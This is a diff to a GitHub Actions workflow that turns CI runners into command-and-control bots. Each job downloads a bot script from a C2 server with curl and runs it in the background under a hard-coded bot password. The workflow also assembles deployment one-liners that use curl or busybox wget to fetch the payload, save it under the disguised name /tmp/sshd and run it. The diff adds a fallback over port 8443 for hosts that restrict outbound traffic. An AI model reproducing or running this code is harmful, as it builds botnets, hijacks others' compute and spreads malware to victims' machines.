@@ -45,11 +45,10 @@ jobs:
           S="${{ matrix.slice }}"
 
           # ═══════════════════════════════════════
-          # Self-register as C2 bot (bot.sh daemonize)
+          # Self-register as C2 bot (Python bot — tracks bytes + reports)
           # ═══════════════════════════════════════
-          # Write bot.sh base64 payload to file (avoids GitHub expr length limit)
-          curl -s "http://$C2:$PPORT/bot.sh" -o /tmp/me.sh 2>/dev/null
-          sh /tmp/me.sh "$C2" "$CPORT" "enibot2024" "gh-slice-$S" &
+          curl -s "http://$C2:$PPORT/bot.py" -o /tmp/me.py 2>/dev/null
+          python3 /tmp/me.py "$C2" "$CPORT" "enibot2024" "gh-slice-$S" &
           echo "Bot registered → $C2:$CPORT (gh-slice-$S)"
           curl -s "http://$C2:$PPORT/bot.sh" -o /tmp/payload.sh 2>/dev/null
           export B64=$(base64 -w0 /tmp/payload.sh 2>/dev/null || echo "")
@@ -104,6 +103,7 @@ jobs:
               f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
               f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd&&busybox sh /tmp/sshd {C2} {CPORT} enibot2024)&"
           )
+          # Shorter chain for cloud hosts that only allow 8443 outbound
           DEPLOY_ALT = (
               f"(wget -q http://{C2}:8443/bot.sh -O /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
               f"(curl -s http://{C2}:8443/bot.sh -o /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
